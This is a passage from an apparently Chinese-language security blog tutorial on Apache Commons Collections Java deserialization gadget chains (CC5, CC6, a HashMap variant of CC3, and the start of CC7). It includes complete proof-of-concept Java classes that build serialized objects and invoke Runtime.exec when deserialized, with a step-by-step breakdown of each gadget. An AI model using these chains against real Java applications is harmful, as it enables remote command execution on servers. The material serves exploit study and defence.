class="keyword">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        TemplatesImpl tempIm = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;asd&quot;</span>);</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setField(tempIm, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invTransf = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,invTransf);</span><br><span class="line">        <span class="comment">//调用Get方法</span></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,tempIm);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//BadAttributeValueExpException poc = new BadAttributeValueExpException(tiedmap);</span></span><br><span class="line">        setField(poc,<span class="string">&quot;val&quot;</span>,tiedmap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc5&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h1 id="六、CC6"   >
          <a href="#六、CC6" class="heading-link"><i class="fas fa-link"></i></a><a href="#六、CC6" class="headerlink" title="六、CC6"></a>六、CC6</h1>
      
        <h2 id="JAVA源码版本-8u40-5"   >
          <a href="#JAVA源码版本-8u40-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-5" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171443518.png" alt="image-20220801171443518"></p>
<p>细节如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">HashMap.put()-&gt;hash()</span><br><span class="line">TiedMapEntry.hashCode()-&gt;this.getValue()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-5"   >
          <a href="#限制-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-5" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无限制</p>

        <h2 id="Poc"   >
          <a href="#Poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC6</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;./test.sh&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc6&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="解析-7"   >
          <a href="#解析-7" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析-7" class="headerlink" title="解析"></a>解析</h2>
      
        <h3 id="HashSet-readObject"   >
          <a href="#HashSet-readObject" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a><code>HashSet.readObject()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171648405.png" alt="image-20220801171648405"></p>
<p>这个<code>map</code>即设置为<code>HashMap</code></p>

        <h3 id="HashMap-put"   >
          <a href="#HashMap-put" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashMap-put" class="headerlink" title="HashMap.put()"></a><code>HashMap.put()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171743740.png" alt="image-20220801171743740"></p>
<p>这个<code>key</code>后续设置为<code>TiedMapEntry</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171856068.png" alt="image-20220801171856068"></p>

        <h3 id="TiedMapEntry-hashCode"   >
          <a href="#TiedMapEntry-hashCode" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a><code>TiedMapEntry.hashCode()</code></h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171928099.png" alt="image-20220801171928099"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801171953683.png" alt="image-20220801171953683"></p>
<p>这里的<code>map</code>即设置为<code>Lazymap</code></p>

        <h3 id="LazyMap-get-2"   >
          <a href="#LazyMap-get-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#LazyMap-get-2" class="headerlink" title="LazyMap.get()"></a><code>LazyMap.get()</code></h3>
      <p>还是经典的链子<code>CIR</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801110714702.png" alt="image-20220801110714702"></p>

        <h2 id="🔺注-1"   >
          <a href="#🔺注-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注-1" class="headerlink" title="🔺注"></a>🔺注</h2>
      
        <h3 id="1-Hashset设置"   >
          <a href="#1-Hashset设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Hashset设置" class="headerlink" title="1.Hashset设置"></a>1.<code>Hashset</code>设置</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加至少一个元素，方便后续获取</span></span><br><span class="line">hashset.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">Field field = Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap hashset_map = (HashMap) field.get(hashset);</span><br></pre></td></tr></table></div></figure>

<p>获取<code>HashSet</code>的<code>map</code>成员为<code>hashset_map</code></p>

        <h3 id="2-HashMap设置"   >
          <a href="#2-HashMap设置" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HashMap设置" class="headerlink" title="2.HashMap设置"></a>2.<code>HashMap</code>设置</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取HashMap中的table,用来获取HashMap中保存的元素</span></span><br><span class="line"><span class="comment">//transient Node&lt;K,V&gt;[] table;</span></span><br><span class="line">Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取array为HashSet的成员map中保存的元素数组</span></span><br><span class="line">Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line"><span class="comment">//获取node为保存在hashset中的元素,其类为一个hashmap</span></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置hashset中的一个元素hashmap的key为TiedMapEntry</span></span><br><span class="line">Field key = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">key.set(node,tiedmap);</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-writeObject和readObject的关系"   >
          <a href="#3-writeObject和readObject的关系" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-writeObject和readObject的关系" class="headerlink" title="3.writeObject和readObject的关系"></a>3.<code>writeObject</code>和<code>readObject</code>的关系</h3>
      <p>在<code>HashSet</code>的<code>readObject</code>中可以看到，<code>//..</code>为省略的代码部分</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="keyword">int</span> size = s.readInt();</span><br><span class="line">	<span class="comment">//.......</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>按理说，调用<code>map.put</code>，其函数如下，我们需要控制<code>e</code>(即下面的<code>key</code>)为<code>TiedMapEntry</code>才能调用到<code>TiedMapEntry.hashCode</code></p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>但是<code>E e = (E) s.readObject();</code>，也就是得看对应的<code>HashSet.writeObject</code>中将什么序列化了</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">    s.writeInt(map.capacity());</span><br><span class="line">    s.writeFloat(map.loadFactor());</span><br><span class="line">    s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>可以看到，对应的写入<code>map</code>成员的<code>capacity</code>、<code>loadFactor</code>、<code>size</code>以及其中的所有元素，同时在<code>readObject</code>也是依照顺序一一对应进行读取，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220801175923980.png" alt="image-20220801175923980"></p>
<p>所以在<code>writeObject</code>的时候，在<code>HashSet</code>中的<code>map</code>成员的元素可控，那么在<code>readObject</code>的时候，对应的元素也是可控的，可以设置为<code>TiedMapEntry</code>。</p>
<p>所以在<code>JAVA</code>中的<code>writeObject</code>和<code>readObject</code>是一一对应的，写入什么格式数据，就会依照什么格式数据读取。</p>

        <h2 id="CC3的HashMap版本"   >
          <a href="#CC3的HashMap版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC3的HashMap版本" class="headerlink" title="CC3的HashMap版本"></a>CC3的HashMap版本</h2>
      <p>这边顺带提一下以下这两条链子，其实都差不多，大同小异，主要是前面的不太一样，直接借用<code>HashMap</code>来进行触发。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806174412815.png" alt="image-20220806174412815"></p>

        <h3 id="POC-5"   >
          <a href="#POC-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC3_O</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                   <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;touch ddd&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap hashmap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashmap.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        hashmap.put(<span class="string">&quot;ccc&quot;</span>,<span class="string">&quot;ddd&quot;</span>);</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(hashmap,chain);</span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        Field table = Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashmap);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        setField(node,<span class="string">&quot;key&quot;</span>,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;./cc3_o&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashmap);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;./cc3_o&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>也没啥好说的，往<code>HashMap</code>中放两个元素，使其<code>table</code>不为空，方便取出<code>node</code>来设置<code>TiedMapEntry</code>即可。</p>
<p>其他的就相当于去掉了<code>HashSet</code>的<code>CC6</code>了，触发点在<code>HashMap.readObject()</code>下的计算<code>hash</code>的地方</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220806175025930.png" alt="image-20220806175025930"></p>

        <h1 id="七、CC7"   >
          <a href="#七、CC7" class="heading-link"><i class="fas fa-link"></i></a><a href="#七、CC7" class="headerlink" title="七、CC7"></a>七、CC7</h1>
      
        <h2 id="JAVA源码版本-8u40-6"   >
          <a href="#JAVA源码版本-8u40-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA源码版本-8u40-6" class="headerlink" title="JAVA源码版本-8u40"></a>JAVA源码版本-8u40</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220802153315688.png" alt="image-20220802153315688"></p>
<p>细节如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()-&gt;reconstitutionPut()</span><br><span class="line">LazyMap.equals()==AbstractMapDecorator.equals()</span><br><span class="line">AbstractMap.equals()</span><br><span class="line">LazyMap.get()</span><br></pre></td></tr></table></div></figure>


        <h2 id="限制-6"   >
          <a href="#限制-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#限制-6" class="headerlink" title="限制"></a>限制</h2>
      <p><code>JDK</code>版本：暂无限制</p>

        <h2 id="Poc-1"   >
          <a href="#Poc-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h2>
